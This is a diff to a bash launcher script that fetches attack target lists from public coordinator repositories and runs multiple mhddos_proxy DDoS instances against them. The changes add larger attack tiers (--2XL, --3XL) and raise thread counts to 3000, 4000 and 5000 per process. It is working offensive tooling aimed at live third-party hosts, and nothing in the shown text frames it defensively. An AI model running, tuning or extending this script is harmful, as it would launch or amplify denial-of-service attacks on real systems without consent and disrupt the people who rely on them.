@@ -39,6 +39,8 @@ echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/speci
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > ~/multidd/targets/source2.txt
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr | select (. != null)')" > ~/multidd/targets/source3.txt
 
+# remove all empty lines (only spaces, only tabs, only new lines)
+sed -i '/^[[:space:]]*$/d' ~/multidd/targets/source*.txt
 # add 'tcp://' to all ip addresses
 sed -i -e 's/^/tcp:\/\//g' ~/multidd/targets/source3.txt
 
@@ -110,7 +112,8 @@ while [ "$1" != "" ]; do
         --M ) export ddos_size="M"; shift ;;
         --L ) export ddos_size="L"; shift ;;
         --XL ) export ddos_size="XL"; shift ;;
-        --XXL ) export ddos_size="XXL"; shift ;;
+        --XXL  | --2XL) export ddos_size="XXL"; shift ;;
+        --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -147,12 +150,19 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 4000 $args_to_pass &
     elif [[ $ddos_size == "XL" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 4 parts
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2500 $args_to_pass &
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2500 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 3000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 3000 $args_to_pass &
         sleep 30
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 2500 $args_to_pass &
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 2500 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 3000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 3000 $args_to_pass &
     elif [[ $ddos_size == "XXL" ]]; then
+        cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 4000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 4000 $args_to_pass &
+        sleep 30
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 4000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 4000 $args_to_pass &
+    elif [[ $ddos_size == "XXXL" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 5000 $args_to_pass &
